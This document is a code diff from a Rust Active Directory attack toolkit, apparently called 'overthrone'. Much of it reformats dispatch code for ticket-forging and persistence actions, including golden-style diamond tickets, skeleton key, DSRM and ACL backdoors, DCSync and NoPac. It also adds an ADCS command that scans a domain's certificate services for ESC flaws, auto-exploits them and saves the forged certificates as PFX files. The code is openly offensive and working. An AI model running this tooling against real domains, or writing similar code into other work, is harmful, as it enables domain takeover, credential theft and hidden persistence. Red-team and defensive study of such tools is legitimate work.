@@ -17,12 +17,12 @@ use overthrone_core::proto::rid::{RidAccountType, RidCycleConfig, rid_cycle};
 use overthrone_core::proto::secretsdump::{dump_dcc2, dump_lsa, dump_sam};
 #[cfg(feature = "crawler")]
 use overthrone_crawler::{CrawlerConfig, run_crawler};
+#[cfg(feature = "forge")]
+use overthrone_forge::runner::{ForgeAction as RunnerForgeAction, ForgeConfig, run_forge};
 #[cfg(feature = "reaper")]
 use overthrone_reaper::laps::enumerate_laps;
 #[cfg(feature = "reaper")]
 use overthrone_reaper::runner::ReaperConfig;
-#[cfg(feature = "forge")]
-use overthrone_forge::runner::{run_forge, ForgeConfig, ForgeAction as RunnerForgeAction};
 use std::collections::HashMap;
 use std::sync::{Arc, Mutex};
 use tracing::warn;
@@ -1037,11 +1037,21 @@ async fn run_forge_action(cli: &Cli, domain: &str, action: &ForgeAction) -> i32 
 
 /// Build a forge runner action from the CLI action variant.
 #[cfg(feature = "forge")]
-fn build_runner_action(_domain: &str, action: &ForgeAction) -> Result<(RunnerForgeAction, std::collections::HashMap<String, String>), String> {
+fn build_runner_action(
+    _domain: &str,
+    action: &ForgeAction,
+) -> Result<(RunnerForgeAction, std::collections::HashMap<String, String>), String> {
     use std::collections::HashMap;
     let mut opts = HashMap::new();
     let runner_action = match action {
-        ForgeAction::Diamond { domain_sid, user, rid, krbtgt_hash, krbtgt_aes256, output } => {
+        ForgeAction::Diamond {
+            domain_sid,
+            user,
+            rid,
+            krbtgt_hash,
+            krbtgt_aes256,
+            output,
+        } => {
             opts.insert("user".to_string(), user.clone());
             opts.insert("rid".to_string(), rid.to_string());
             opts.insert("domain_sid".to_string(), domain_sid.clone());
@@ -1052,7 +1062,11 @@ fn build_runner_action(_domain: &str, action: &ForgeAction) -> Result<(RunnerFor
             opts.insert("output".to_string(), output.clone());
             RunnerForgeAction::DiamondTicket
         }
-        ForgeAction::Sapphire { domain_sid, user, output } => {
+        ForgeAction::Sapphire {
+            domain_sid,
+            user,
+            output,
+        } => {
             opts.insert("user".to_string(), user.clone());
             opts.insert("domain_sid".to_string(), domain_sid.clone());
             opts.insert("output".to_string(), output.clone());
@@ -1060,15 +1074,27 @@ fn build_runner_action(_domain: &str, action: &ForgeAction) -> Result<(RunnerFor
         }
         ForgeAction::BronzeBit { spn, output } => {
             opts.insert("output".to_string(), output.clone());
-            RunnerForgeAction::BronzeBit { target_spn: spn.clone() }
+            RunnerForgeAction::BronzeBit {
+                target_spn: spn.clone(),
+            }
         }
-        ForgeAction::InterRealmTgt { target_domain, domain_sid, krbtgt_hash, output } => {
+        ForgeAction::InterRealmTgt {
+            target_domain,
+            domain_sid,
+            krbtgt_hash,
+            output,
+        } => {
             opts.insert("domain_sid".to_string(), domain_sid.clone());
             opts.insert("krbtgt_hash".to_string(), krbtgt_hash.clone());
             opts.insert("output".to_string(), output.clone());
-            RunnerForgeAction::InterRealmTgt { target_domain: target_domain.clone() }
+            RunnerForgeAction::InterRealmTgt {
+                target_domain: target_domain.clone(),
+            }
         }
-        ForgeAction::SkeletonKey { payload_path, master_password } => {
+        ForgeAction::SkeletonKey {
+            payload_path,
+            master_password,
+        } => {
             if let Some(p) = payload_path {
                 if !std::path::Path::new(p).exists() {
                     return Err(format!("payload_path '{}' does not exist", p));
@@ -1078,23 +1104,31 @@ fn build_runner_action(_domain: &str, action: &ForgeAction) -> Result<(RunnerFor
             opts.insert("master_password".to_string(), master_password.clone());
             RunnerForgeAction::SkeletonKey
         }
-        ForgeAction::DsrmBackdoor { domain_sid, krbtgt_hash } => {
+        ForgeAction::DsrmBackdoor {
+            domain_sid,
+            krbtgt_hash,
+        } => {
             opts.insert("domain_sid".to_string(), domain_sid.clone());
             opts.insert("krbtgt_hash".to_string(), krbtgt_hash.clone());
             RunnerForgeAction::DsrmBackdoor
         }
         ForgeAction::DcSyncUser { user } => {
             opts.insert("user".to_string(), user.clone());
-            RunnerForgeAction::DcSyncUser { target_user: user.clone() }
+            RunnerForgeAction::DcSyncUser {
+                target_user: user.clone(),
+            }
         }
         ForgeAction::AclBackdoor { target_dn, trustee } => {
             opts.insert("target_dn".to_string(), target_dn.clone());
             opts.insert("trustee".to_string(), trustee.clone());
-            RunnerForgeAction::AclBackdoor { target_dn: target_dn.clone(), trustee: trustee.clone() }
+            RunnerForgeAction::AclBackdoor {
+                target_dn: target_dn.clone(),
+                trustee: trustee.clone(),
+            }
         }
-        ForgeAction::NoPac { target_dc } => {
-            RunnerForgeAction::NoPac { target_dc: target_dc.clone() }
-        }
+        ForgeAction::NoPac { target_dc } => RunnerForgeAction::NoPac {
+            target_dc: target_dc.clone(),
+        },
         ForgeAction::ConvertTicket { input, format } => {
             opts.insert("input".to_string(), input.clone());
             opts.insert("format".to_string(), format.clone());
@@ -3577,6 +3611,139 @@ pub async fn cmd_adcs(cli: &Cli, action: &AdcsAction) -> i32 {
                 }
             }
         }
+        AdcsAction::Auto {
+            ca,
+            template,
+            target_user,
+            exploit,
+        } => {
+            use overthrone_core::adcs::auto_exploit::{AdcsAutoConfig, AdcsAutoScanner};
+
+            let dc_host = cli
+                .dc_host
+                .as_deref()
+                .unwrap_or(ca.as_deref().unwrap_or_default());
+            let domain = cli.domain.as_deref().unwrap_or("");
+            let username = cli.username.as_deref().unwrap_or("");
+            let password = cli.password.as_deref().unwrap_or("");
+
+            if domain.is_empty() || username.is_empty() || password.is_empty() {
+                banner::print_fail(
+                    "Domain, username, and password are required for ADCS auto-scan",
+                );
+                return 1;
+            }
+
+            let config = AdcsAutoConfig {
+                domain: domain.to_string(),
+                dc_host: dc_host.to_string(),
+                username: username.to_string(),
+                password: password.to_string(),
+                ca_server: ca.clone(),
+                target_template: template.clone(),
+                target_upn: target_user.clone(),
+                use_ldaps: false,
+            };
+
+            let scanner = AdcsAutoScanner::new(config);
+            banner::print_info("Scanning for ADCS ESC vulnerabilities...");
+
+            let mut report = match scanner.scan().await {
+                Ok(r) => r,
+                Err(e) => {
+                    banner::print_fail(&format!("ADCS scan failed: {e}"));
+                    return 1;
+                }
+            };
+
+            println!();
+            println!(
+                "  {} ADCS ESC Scan Results for {}",
+                ">".bright_black(),
+                domain.cyan()
+            );
+            if let Some(ref ca) = report.ca_server {
+                println!("  {} CA Server: {}", ">".bright_black(), ca.cyan());
+            }
+            println!(
+                "  {} Templates found: {}",
+                ">".bright_black(),
+                report.templates.len().to_string().yellow()
+            );
+            println!(
+                "  {} Vulnerabilities found: {}",
+                ">".bright_black(),
+                report.vulnerabilities.len().to_string().yellow()
+            );
+            println!();
+
+            if report.vulnerabilities.is_empty() {
+                banner::print_warn("No ESC vulnerabilities detected");
+                return 0;
+            }
+
+            for vuln in &report.vulnerabilities {
+                let sev_color = match vuln.severity.as_str() {
+                    "Critical" => "CRITICAL".red(),
+                    "High" => "HIGH".yellow(),
+                    _ => vuln.severity.dimmed(),
+                };
+                println!(
+                    "  {} {} — {}",
+                    sev_color,
+                    format!("ESC{}", vuln.esc_number).bright_white(),
+                    vuln.description().dimmed()
+                );
+                println!("    {}", format!("Target: {}", vuln.target).dimmed());
+            }
+
+            if *exploit {
+                println!();
+                banner::print_info("Attempting auto-exploitation of most severe findings...");
+                match scanner.auto_exploit(&mut report).await {
+                    Ok(()) => {
+                        let exploited: Vec<_> = report
+                            .vulnerabilities
+                            .iter()
+                            .filter(|v| v.auto_exploited)
+                            .collect();
+                        if exploited.is_empty() {
+                            banner::print_warn("Auto-exploitation did not yield any certificates");
+                            for vuln in &report.vulnerabilities {
+                                if let Some(ref err) = vuln.exploit_error {
+                                    println!(
+                                        "  {} ESC{}: {}",
+                                        "[-]".red(),
+                                        vuln.esc_number,
+                                        err.dimmed()
+                                    );
+                                }
+                            }
+                        } else {
+                            for v in &exploited {
+                                let path = format!("esc{}_{}.pfx", v.esc_number, v.target);
+                                if let Some(ref pfx) = v.pfx_data {
+                                    if let Err(e) = tokio::fs::write(&path, pfx).await {
+                                        banner::print_fail(&format!("Failed to write PFX: {e}"));
+                                    } else {
+                                        println!(
+                                            "  {} ESC{} exploited — saved to {}",
+                                            "[+]".green(),
+                                            v.esc_number,
+                                            path.cyan()
+                                        );
+                                    }
+                                }
+                            }
+                        }
+                    }
+                    Err(e) => {
+                        banner::print_fail(&format!("Auto-exploit failed: {e}"));
+                        return 1;
+                    }
+                }
+            }
+        }
     }
 
     banner::print_success("ADCS operation completed");
@@ -3981,11 +4148,7 @@ pub async fn cmd_scan(
                         );
                     }
                     if let Some(nc) = res.naming_contexts.first() {
-                        println!(
-                            "    {} Naming Contexts: {}",
-                            ">".bright_black(),
-                            nc.cyan()
-                        );
+                        println!("    {} Naming Contexts: {}", ">".bright_black(), nc.cyan());
                     }
                 }
                 // Anonymous bind
